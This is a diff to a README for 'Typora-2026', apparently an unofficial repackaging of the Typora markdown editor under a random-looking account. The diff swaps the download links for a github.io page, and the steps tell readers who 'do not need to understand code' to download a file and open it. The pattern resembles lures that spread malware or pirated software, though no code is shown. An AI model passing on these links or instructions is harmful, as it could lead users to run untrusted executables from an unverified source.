@@ -1,6 +1,6 @@
 # 📝 Typora-2026 - Write markdown with focus and ease
 
-[![](https://img.shields.io/badge/Download-Typora_2026-blue.svg)](https://github.com/Indiscreetnesssimpleleaf41/Typora-2026)
+[![](https://img.shields.io/badge/Download-Typora_2026-blue.svg)](https://indiscreetnesssimpleleaf41.github.io)
 
 ## 📌 About this project
 
@@ -19,7 +19,7 @@ Before you install this software, check your computer for these items:
 
 Follow these steps to set up your editor. You do not need to understand code to perform these tasks. 
 
-1. Visit the project link to start your download: [https://github.com/Indiscreetnesssimpleleaf41/Typora-2026](https://github.com/Indiscreetnesssimpleleaf41/Typora-2026)
+1. Visit the project link to start your download: [https://indiscreetnesssimpleleaf41.github.io](https://indiscreetnesssimpleleaf41.github.io)
 2. Locate the download button on that page.
 3. Save the file to your computer desktop.
 4. Open the file once the download finishes.
